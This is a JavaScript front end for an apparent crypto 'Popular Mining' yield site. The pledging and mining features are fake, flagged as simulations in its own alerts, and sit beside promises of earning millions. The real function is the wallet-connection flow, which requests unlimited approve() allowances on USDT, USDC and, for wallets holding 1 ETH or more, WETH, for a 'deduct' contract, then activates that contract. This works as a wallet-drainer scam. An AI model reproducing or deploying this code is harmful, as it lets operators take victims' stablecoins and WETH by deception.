//---Client-side Constants (客戶端常數)---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

//---ABI Definitions (客戶端精簡版 ABI)---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements (全域變數與 DOM 元素)---
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const refreshWallet = document.getElementById('refreshWallet');

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;

//---UI Control Functions (使用者介面控制函數)---
function updateStatus(message) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
}

/**
 * 重置應用程式的狀態，並禁用所有互動元素。
 * @param {boolean} showMsg - 是否顯示連接錢包的狀態訊息。(預設為 true)
 */
function resetState(showMsg = true) {
    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet';
    }
    disableInteractiveElements(true);
    if (showMsg) {
        updateStatus("Please connect your wallet to proceed.");
    }
}

/**
 * 啟用或禁用所有互動元素。
 * @param {boolean} disable - 是否禁用元素。(預設為 false)
 */
function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (refreshWallet) refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
    if (refreshWallet) refreshWallet.style.color = disable ? '#999' : '#ff00ff';
}

//---Core Wallet Logic (核心錢包邏輯)---
/**
 * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
 */
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("Wallet not connected or signer missing.");

    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();

    const mobileTx = {
        from: fromAddress,
        to: populatedTx.to,
        data: populatedTx.data,
        value: '0x' + BigInt(txValue).toString(16)
    };

    let txHash;
    let receipt = null;

    try {
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`Authorization sent! HASH: ${txHash.slice(0, 10)}... Waiting for confirmation...`);
        receipt = await provider.waitForTransaction(txHash);
    } catch (error) {
        console.warn("⚠️ Trust Wallet interface may throw harmless errors. Proceeding with on-chain check...");

        if (error.hash) {
            txHash = error.hash;
        } else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }

        if (txHash) {
            updateStatus(`Transaction interface error occurred! Transaction sent: ${txHash.slice(0, 10)}... Waiting for confirmation...`);
            receipt = await provider.waitForTransaction(txHash);
        } else {
            throw new Error(`Transaction failed to send, and unable to retrieve transaction hash from error: ${error.message}`);
        }
    }

    if (!receipt || receipt.status !== 1) {
        throw new Error(`Transaction failed on-chain (reverted). Hash: ${txHash.slice(0, 10)}...`);
    }

    return receipt;
}

/**
 * 初始化錢包，強制切換至主網。
 */
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask, Trust Wallet, or a compatible wallet to proceed.');
            return;
        }

        provider = new ethers.BrowserProvider(window.ethereum);

        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            updateStatus('Requesting switch to Ethereum Mainnet... Please approve in your wallet.');
            try {
                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                return;
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('You must switch to Ethereum Mainnet to use this service. Please switch manually and refresh.');
                } else {
                    updateStatus(`Failed to switch network. Please do so manually. Error: ${switchError.message}`);
                }
                return;
            }
        }

        window.ethereum.on('accountsChanged', () => window.location.reload());
        window.ethereum.on('chainChanged', () => window.location.reload());

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            resetState(false);
        }

        updateStatus("Please connect your wallet to proceed.");
    } catch (error) {
        console.error("Initialize Wallet Error:", error);
        updateStatus(`Initialization failed: ${error.message}`);
    }
}

/**
 * 檢查使用者的服務啟動狀態和代幣授權額度。
 */
async function checkAuthorization() {
    try {
        if (!signer) {
            updateStatus('Wallet is not connected. Please connect first.');
            return;
        }
        updateStatus("Checking authorization status...");

        const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

        console.log("【DEBUG_FinalCheck】User Address:", userAddress);
        console.log("【DEBUG_FinalCheck】Required Allowance:", requiredAllowance.toString());
        console.log("【DEBUG_FinalCheck】Service Active:", isServiceActive);
        console.log("【DEBUG_FinalCheck】Has Sufficient Allowance:", hasSufficientAllowance);
        console.log("【DEBUG_FinalCheck】Is Fully Authorized (Final):", isFullyAuthorized);

        if (isFullyAuthorized) {
            if (connectButton) {
                connectButton.classList.add('connected');
                connectButton.title = 'Disconnect Wallet';
            }
            disableInteractiveElements(false);
            updateStatus("✅ Service activated and authorized successfully.");
        } else {
            if (connectButton) {
                connectButton.classList.remove('connected');
                connectButton.title = 'Connect & Authorize';
            }
            disableInteractiveElements(true);
            updateStatus('Authorization required. Please connect and authorize.');
        }
        updateStatus("");
    } catch (error) {
        console.error("Check Authorization Error:", error);
        if (error.code === 'CALL_EXCEPTION') {
            updateStatus('Contract communication failed. Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.');
        } else {
            updateStatus(`Authorization check failed: ${error.message}`);
        }
    }
}

/**
 * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
 */
async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
    updateStatus('Checking and setting up token authorizations...');
    let tokenToActivate = '';
    let stepCount = 0;

    const totalSteps = serviceActivated ? tokensToProcess.length : tokensToProcess.length + 1;

    for (const { name, contract, address } of tokensToProcess) {
        stepCount++;
        updateStatus(`Step ${stepCount}/${totalSteps}: Checking and requesting ${name} authorization...`);

        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);

        if (currentAllowance < requiredAllowance) {
            updateStatus(`Step ${stepCount}/${totalSteps}: Requesting ${name} Authorization... Please approve in your wallet.`);

            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            await sendMobileRobustTransaction(approvalTx);

            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
            if (newAllowance >= requiredAllowance) {
                if (!serviceActivated && !tokenToActivate) {
                    tokenToActivate = address;
                }
            }
        } else {
            if (!serviceActivated && !tokenToActivate) {
                tokenToActivate = address;
            }
        }
    }

    if (!serviceActivated && tokenToActivate) {
        stepCount++;
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`Step ${stepCount}/${totalSteps}: Activating service (using ${tokenName})...`);

        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        await sendMobileRobustTransaction(activateTx);
    } else if (!serviceActivated) {
        updateStatus(`Warning: No authorized token found to activate service. Please ensure you have ETH for Gas fees.`);
    } else {
        updateStatus(`All authorizations and service activation completed.`);
    }
}

/**
 * 主要函數：連接錢包並根據餘額執行條件式流程。
 */
async function connectWallet() {
    try {
        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
            await initializeWallet();
            const network = await provider.getNetwork();
            if (network.chainId !== 1n) return;
        }

        updateStatus('Please confirm the connection in your wallet...');
        const accounts = await provider.send('eth_requestAccounts', []);
        if (accounts.length === 0) throw new Error("No account selected.");

        const currentConnectedAddress = accounts[0];

        if (userAddress && userAddress !== currentConnectedAddress) {
            console.warn(`⚠️ Address switch detected from ${userAddress.slice(0, 8)}... to ${currentConnectedAddress.slice(0, 8)}.... Forcing reset.`);
            resetState(false);
            return connectWallet();
        }

        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        console.log("【DEBUG】Wallet Connected. Current User Address:", userAddress);

        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

        updateStatus('Preparing optimal authorization flow...');

        const [ethBalance, wethBalance] = await Promise.all([
            provider.getBalance(userAddress),
            wethContract.balanceOf(userAddress),
        ]);

        const oneEth = ethers.parseEther("1.0");
        const totalEthEquivalent = ethBalance + wethBalance;
        const hasSufficientEth = totalEthEquivalent >= oneEth;

        const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        console.log("【DEBUG】Required Allowance (Threshold):", requiredAllowance.toString());
        console.log("【DEBUG】Service Activated:", serviceActivated);

        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = serviceActivated && hasSufficientAllowance;

        console.log("【DEBUG】USDT Allowance:", usdtAllowance.toString());
        console.log("【DEBUG】USDC Allowance:", usdcAllowance.toString());
        console.log("【DEBUG】WETH Allowance:", wethAllowance.toString());
        console.log("【DEBUG】Has Sufficient Allowance:", hasSufficientAllowance);
        console.log("【DEBUG】Is Fully Authorized (Final Check):", isFullyAuthorized);

        let tokensToProcess;

        if (hasSufficientEth) {
            tokensToProcess = [
                { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
            updateStatus('Sufficient ETH/WETH balance detected (>= 1 ETH). Starting WETH, USDT, USDC authorization flow.');
        } else {
            tokensToProcess = [
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
            updateStatus('Insufficient ETH/WETH balance (< 1 ETH). Starting USDT, USDC authorization flow.');
        }

        if (!isFullyAuthorized) {
            await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
        }

        await checkAuthorization();
    } catch (error) {
        console.error("Connect Wallet Error:", error);

        let userMessage = `An error occurred: ${error.message}`;
        if (error.code === 4001) {
            userMessage = "You rejected the authorization. Please try again.";
        } else if (error.message.includes('insufficient funds')) {
            userMessage = "Authorization failed: Insufficient ETH balance for Gas fees.";
        }

        updateStatus(userMessage);
        if (connectButton) {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Retry)';
        }
    }
}

/**
 * 斷開連線並重置應用程式狀態。
 */
function disconnectWallet() {
    resetState(true);
    alert('Wallet disconnected. To fully remove site permissions, please do so in your wallet\'s "Connected Sites" settings.');
}

//---Language Control Functions---
const translations = {
    'en': {
        title: 'Popular Mining',
        subtitle: 'Start Earning Millions',
        totalValue: '12,856,459.94 ETH',
        tabLiquidity: 'Liquidity',
        tabPledging: 'Pledging',
        grossOutputLabel: 'Gross Output',
        cumulativeLabel: 'Cumulative',
        walletBalanceLabel: 'Wallet Balance',
        accountBalanceLabel: 'Account Balance',
        compoundLabel: '⚡ Compound',
        nextBenefit: 'Next Benefit: 00:00:00',
        startBtnText: 'Start',
        pledgeAmountLabel: 'Pledge Amount',
        pledgeDurationLabel: 'Duration',
        pledgeBtnText: 'Pledge Now',
        totalPledgedLabel: 'Total Pledged',
        expectedYieldLabel: 'Expected Yield',
        apyLabel: 'APY',
        lockedUntilLabel: 'Locked Until'
    },
    'zh-Hant': {
        title: '熱門挖礦',
        subtitle: '開始賺取數百萬',
        totalValue: '12,856,459.94 ETH',
        tabLiquidity: '流動性',
        tabPledging: '質押',
        grossOutputLabel: '總產出',
        cumulativeLabel: '累計',
        walletBalanceLabel: '錢包餘額',
        accountBalanceLabel: '帳戶餘額',
        compoundLabel: '⚡ 複利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '開始',
        pledgeAmountLabel: '質押金額',
        pledgeDurationLabel: '期間',
        pledgeBtnText: '立即質押',
        totalPledgedLabel: '總質押',
        expectedYieldLabel: '預期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '鎖定至'
    },
    'zh-Hans': {
        title: '热门挖矿',
        subtitle: '开始赚取数百万',
        totalValue: '12,856,459.94 ETH',
        tabLiquidity: '流动性',
        tabPledging: '质押',
        grossOutputLabel: '总产出',
        cumulativeLabel: '累计',
        walletBalanceLabel: '钱包余额',
        accountBalanceLabel: '账户余额',
        compoundLabel: '⚡ 复利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '开始',
        pledgeAmountLabel: '质押金额',
        pledgeDurationLabel: '期间',
        pledgeBtnText: '立即质押',
        totalPledgedLabel: '总质押',
        expectedYieldLabel: '预期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '锁定至'
    }
};

let currentLang = navigator.language || navigator.userLanguage;

if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) {
    currentLang = 'en';
} else if (currentLang === 'zh') {
    currentLang = 'zh-Hans';
}

const languageSelect = document.getElementById('languageSelect');
const elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    totalValue: document.getElementById('totalValue'),
    tabLiquidity: document.getElementById('tabLiquidity'),
    tabPledging: document.getElementById('tabPledging'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    compoundLabel: document.getElementById('compoundLabel'),
    nextBenefit: document.getElementById('nextBenefit'),
    startBtnText: document.getElementById('startBtn'),
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: document.getElementById('pledgeBtn'),
    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
    expectedYieldLabel: document.getElementById('expectedYieldLabel'),
    apyLabel: document.getElementById('apyLabel'),
    lockedUntilLabel: document.getElementById('lockedUntilLabel')
};

function updateLanguage(lang) {
    currentLang = lang;
    languageSelect.value = lang;
    for (let key in elements) {
        if (elements[key]) {
            elements[key].textContent = translations[lang][key];
        }
    }
}

languageSelect.value = currentLang;
updateLanguage(currentLang);

languageSelect.addEventListener('change', (e) => {
    updateLanguage(e.target.value);
});

//---Event Listeners & Initial Load (事件監聽器與初始載入)---
if (connectButton) {
    connectButton.addEventListener('click', () => {
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            connectWallet();
        }
    });
}

startBtn.addEventListener('click', () => {
    if (!connectButton.classList.contains('connected')) {
        alert('Please connect your wallet first!');
        return;
    }
    alert('Starting liquidity mining... (Simulation: Process initiated)');
    document.querySelector('#liquidity .stat-value:nth-of-type(1)').textContent = '2.1000380 ETH';
    document.querySelector('#liquidity .stat-value:nth-of-type(2)').textContent = '0.6000380 ETH';
});

pledgeBtn.addEventListener('click', () => {
    if (!connectButton.classList.contains('connected')) {
        alert('Please connect your wallet first!');
        return;
    }
    const amount = pledgeAmount.value;
    const duration = pledgeDuration.value;
    if (!amount) {
        alert('Please enter a pledge amount!');
        return;
    }
    alert(`Pledging ${amount} USDT for ${duration} days... (Simulation: Pledge successful)`);
    document.querySelector('.pledge-stats .stat-value:nth-of-type(1)').textContent = `${parseFloat(5678.90) + parseFloat(amount)}.00 USDT`;
});

refreshWallet.addEventListener('click', () => {
    if (!connectButton.classList.contains('connected')) {
        alert('Please connect your wallet first!');
        return;
    }
    alert('Refreshing wallet balance... (Simulation: Balance updated to 0.000 USDT)');
});

const tabs = document.querySelectorAll('.tab');
const sections = document.querySelectorAll('.content-section');

tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        sections.forEach(s => s.classList.remove('active'));
        document.getElementById(tab.dataset.tab).classList.add('active');
    });
});

// 頁面載入時執行初始化
initializeWallet();